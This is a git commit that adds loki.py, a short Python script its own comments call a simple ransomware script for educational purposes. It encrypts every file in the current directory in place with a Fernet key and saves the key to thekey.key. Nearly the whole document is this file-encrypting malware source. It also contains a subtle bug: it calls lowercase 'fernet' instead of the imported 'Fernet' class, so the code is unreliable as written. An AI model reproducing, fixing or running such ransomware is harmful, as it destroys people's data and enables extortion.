c498f24849b48169ff6eecd12f5346809c9d7f51
Homer Frias <89124313+jhin-hughes@users.noreply.github.com>
2022-05-17 08:22:55 +0000

    Create loki.py

---
+++ loki.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python3
+#This is a simple ransomware script for encryption
+#Please see thor.py for decryption
+#For educational purposes only
+
+import os
+from cryptography.fernet import Fernet
+
+files = []
+
+for file in os.listdir():
+  if file == "loki.py" or file == "thekey.key":
+    continue
+  if os.path.isfile(file):
+    files.append(file)
+ 
+key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey:
+  thekey.write(key)
+  
+for file in files:
+  with open(file, "rb") as thefile:
+    contents = thefile.read()
+  contents_encrypted = fernet(key).encrypt(contents)
+  with open(file, "wb") as thefile:
+    thefile.write(contents_encrypted)
